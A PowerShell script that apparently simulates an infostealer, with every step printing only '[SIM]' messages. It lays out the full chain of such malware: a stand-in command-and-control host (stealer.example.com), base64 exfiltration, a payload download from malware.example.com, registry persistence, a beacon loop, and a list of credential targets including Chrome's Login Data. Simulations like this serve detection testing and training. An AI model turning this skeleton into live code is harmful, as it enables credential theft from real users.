$C2 = "stealer.example.com"


function Encode-And-Send {
    param($content)

    $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($content))
    Write-Output "[SIM] Sending to http://$C2/exfil"
    Write-Output "[SIM] Data: $encoded"
}

function Drop-Payload {
    Write-Output "[SIM] Downloading payload from http://malware.example.com"
    Write-Output "[SIM] Executing payload"
}

function Persistence {
    Write-Output "[SIM] Writing registry run key"
}



function Beacon {
    $info = Get-UserData | ConvertTo-Json
    Write-Output "[SIM] Beacon: $info"
}


function Get-UserData {
    $data = @{
        User = $env:USERNAME
        Host = $env:COMPUTERNAME
    }
    return $data
}

function Collect-Files {
    $targets = @(
        "Desktop\passwords.txt",
        "Documents\login.xlsx",
        "AppData\Chrome\Login Data"
    )

    foreach ($file in $targets) {
        Write-Output "[SIM] Checking $file"
    }

    return $targets
}



Persistence
Drop-Payload

$files = Collect-Files

foreach ($f in $files) {
    Encode-And-Send $f
}

while ($true) {
    Beacon
    Start-Sleep -Seconds 25
}